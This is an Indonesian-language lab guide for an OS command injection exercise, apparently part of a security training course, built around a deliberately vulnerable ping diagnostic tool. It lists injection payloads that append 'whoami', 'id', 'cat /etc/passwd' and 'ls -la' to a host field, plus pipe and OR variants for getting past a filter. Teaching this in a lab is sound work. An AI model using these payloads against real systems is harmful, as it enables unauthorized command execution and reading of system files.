Module 4: OS Command Injection (RCE)

Eksploitasi fitur diagnostik jaringan untuk mengeksekusi perintah shell sistem operasi pada server.

OWASP Top 10: A03:2021-Injection (Critical RCE)
Network Diagnostics: Host Ping Tool

Utilitas diagnostik ini digunakan oleh admin SOC untuk memverifikasi status konektivitas server gateway.

Panduan Perintah Peserta:

Jika Lab berjalan di Linux/Docker:

  • 127.0.0.1; whoami
  • 127.0.0.1; id
  • 127.0.0.1; cat /etc/passwd
  • 127.0.0.1; ls -la

Jika Filter Aktif (Memblokir ; dan &&):

  • Gunakan operator Pipe: 127.0.0.1 | whoami
  • Gunakan operator OR: invalid_host || whoami
